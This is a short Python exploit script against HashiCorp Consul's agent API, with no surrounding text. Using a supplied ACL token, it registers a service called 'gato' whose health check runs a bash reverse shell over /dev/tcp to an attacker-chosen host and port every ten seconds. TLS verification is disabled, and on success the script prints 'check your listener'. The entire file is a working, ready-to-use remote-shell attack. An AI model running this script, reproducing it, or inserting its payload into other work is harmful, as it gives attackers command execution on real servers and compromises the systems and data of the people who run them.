#!/usr/bin/python3
import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", "-rh", type=str, help="remote host (if not specified, 127.0.0.1 will be used)", default="127.0.0.1")
parser.add_argument("--rport", "-rp", type=str, help="remote port (if not specified, 8500 will be used)", default="8500")
parser.add_argument("--lhost", "-lh", type=str, help="local host", required=True)
parser.add_argument("--lport", "-lp", type=str, help="local port", required=True)
parser.add_argument("--token", "-tk", type=str, help="acl token", required=True)
parser.add_argument("--ssl", "-s", action="store_true", help="use ssl (https) in the request")
args = parser.parse_args()

if args.ssl:
    target = f"https://{args.rhost}:{args.rport}/v1/agent/service/register"
else:
    target = f"http://{args.rhost}:{args.rport}/v1/agent/service/register"

headers = {"X-Consul-Token": f"{args.token}"}
json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}

try:
    requests.put(target, headers=headers, json=json, verify=False)
    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
except:
    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")
    exit(1)
